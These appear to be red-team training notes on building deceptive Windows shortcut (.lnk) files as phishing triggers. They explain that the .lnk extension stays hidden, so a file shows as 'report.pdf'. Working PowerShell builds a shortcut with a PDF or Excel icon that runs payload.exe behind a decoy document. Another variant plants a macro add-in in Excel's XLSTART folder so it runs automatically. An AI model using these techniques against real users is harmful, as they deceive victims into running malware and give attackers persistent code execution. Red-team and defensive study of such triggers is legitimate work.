A shell link is a binary file format used to create Windows shortcuts.  They have the `.lnk` file extension which is special in that it's not shown in Explorer, even when 'show file name extensions' is enabled.  This allows them to have filenames such as `report.pdf.lnk`, and the user will only see `report.pdf`.  Link files can also be customised to have any icon, so they could link to cmd.exe but have a PDF icon.  These properties make them one of the most deceptive triggers.

The easiest way to create a link is with the **WScript.Shell** COM object via PowerShell.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

![[Pasted image 20250701224619.png]]

You may also store an ICO file as a dependency inside the container, and use that instead of one built into an existing application.

If using an Excel Add-In payload, the arguments for the shortcut should copy the XLAM file to the user's XLSTART directory before opening a decoy spreadsheet to trigger execution.

```powershell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```